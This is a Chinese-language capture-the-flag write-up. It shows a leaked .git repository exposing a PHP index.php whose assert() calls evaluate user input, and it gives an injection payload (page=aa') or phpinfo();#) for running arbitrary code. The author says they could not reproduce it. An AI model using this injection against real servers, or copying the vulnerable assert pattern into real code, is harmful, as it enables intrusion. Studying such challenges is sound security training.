**一.题目链接：自己搜**

**二.相关知识点**

**1.assert()**

`assert(mixed $assertion, Throwable|string|null $description = null): bool`

assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动

assert()函数其实是一个断言函数。

这个函数在php语言中是用来判断一个表达式是否成立。返回true or false;

如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。

**2.strpos()**

`strpos(string $haystack, string $needle, int $offset = 0): int|false`

strpos(）用于匹配关键字符needle在字符串haystack中第一次出现的位置

语法：strpos(string,find,start)

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1712497944759-a34d1d1f-e292-4d99-a0d1-6f216d492c5e.png)

**三.解题思路**

打开容器，发现应该名为"my php website"的网页，随便点几下发现有Git显示，怀疑题目存在.git泄露

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1712496586656-9d6174d1-8d83-4720-860e-633d299a0817.png)

在题目链接后加上/.git/，发现有git源码泄露，利用工具下载网页源码，打开后有几个php文件，但是除了index.php其他的都没什么东西，于是对index.php进行代码审计。

```php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		
		<title>My PHP Website</title>
		
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" />
	</head>
	<body>
		<nav class="navbar navbar-inverse navbar-fixed-top">
			<div class="container">
		    	<div class="navbar-header">
		    		<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
		            	<span class="sr-only">Toggle navigation</span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		          	</button>
		          	<a class="navbar-brand" href="#">Project name</a>
		        </div>
		        <div id="navbar" class="collapse navbar-collapse">
		          	<ul class="nav navbar-nav">
		            	<li <?php if ($page == "home") { ?>class="active"<?php } ?>><a href="?page=home">Home</a></li>
		            	<li <?php if ($page == "about") { ?>class="active"<?php } ?>><a href="?page=about">About</a></li>
		            	<li <?php if ($page == "contact") { ?>class="active"<?php } ?>><a href="?page=contact">Contact</a></li>
						<!--<li <?php if ($page == "flag") { ?>class="active"<?php } ?>><a href="?page=flag">My secrets</a></li> -->
		          	</ul>
		        </div>
		    </div>
		</nav>
		
		<div class="container" style="margin-top: 50px">
			<?php
				require_once $file;
			?>
			
		</div>
		
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js" />
		<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" />
	</body>
</html>
```

	这道题的重点在以下位置：

```php
$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
```

	以上代码表示题目会在file变量赋值内容后加上.php，并过滤file中的..，但由于没有过滤file中的其他字符，因此，可以通过构造闭合来实现任意代码执行，具体为：page=aa') or phpinfo();#，这样代码就变为了

`$file=templates/aa') or phpinfo();#.php`

然后源码中的判断变成了下面这样：

```php
assert("strpos('templates/aa') or phpinfo();#.php', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('templates/aa') or phpinfo();#.php')") or die("That file doesn't exist!");
```

就能执行phpinfo();

_(我擦我服了这容器不知道为什么就是复现不了执行哪个都是黑屏算了不整了反正明白这个意思就行了散会）_



